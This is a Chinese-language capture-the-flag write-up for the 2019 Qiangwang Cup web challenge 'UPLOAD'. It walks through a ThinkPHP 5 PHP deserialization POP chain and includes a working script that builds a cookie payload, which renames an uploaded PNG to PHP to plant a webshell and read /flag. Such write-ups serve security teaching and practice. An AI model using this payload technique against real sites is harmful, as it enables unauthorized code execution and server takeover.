# UPLOAD

> 分类：Web（2019 第三届强网杯·全国赛）

## 题目描述

ThinkPHP 5 框架，存在登录/注册/上传图片功能，通过反序列化漏洞实现 getshell。

## 考察知识点

- ThinkPHP 5 代码审计
- PHP 反序列化 POP 链（`__destruct`、`__call`、`__get`）
- 任意文件上传

## 解法

1. 扫描敏感文件发现 `/www.tar.gz`，下载解压得到源码（ThinkPHP 5，有 .idea 目录）。
2. 审计发现：
   - `Index.php` 的 `login_check` 方法反序列化 cookie 中的 user profile。
   - `Profile.php` 有 `_call` 和 `_get` 两个魔术方法，`_call` 会调用 `name` 成员所指代的方法；上传逻辑 `@copy($this->filename_tmp, $this->filename)`。
   - `Register.php` 的 `__destruct` 在未注册时调用 `checker->index()`。
3. POP 链：`Register::__destruct -> Profile::__call -> Profile::__get -> Profile::upload_img()`，控制 `filename`/`filename_tmp`/`ext`，把上传的 png 改名为 php。
4. 构造序列化 payload（命名空间 `app\web\controller`）：

```php
<?php
namespace app\web\controller;
class Profile {
    public $checker; public $filename_tmp; public $filename;
    public $upload_menu; public $ext; public $img; public $except;
}
class Register {
    public $checker; public $registed;
}
$profile = new Profile();
$profile->except = ['index' => 'img'];
$profile->img = "upload_img";
$profile->ext = "png";
$profile->filename_tmp = "../public/upload/xxx/yyy.png";
$profile->filename = "../public/upload/xxx/yyy.php";
$register = new Register();
$register->registed = false;
$register->checker = $profile;
echo urlencode(base64_encode(serialize($register)));
```

5. 将结果设为 cookie（`user`），刷新页面触发反序列化，png 被改名为 php，蚁剑连接读取 `/flag`。

## 参考答案

（flag 通过 getshell 读取 /flag）

## 来源

- 作者：glzjin | https://www.zhaoj.in/read-5873.html
- 复现环境：https://github.com/CTFTraining/qwb_2019_upload
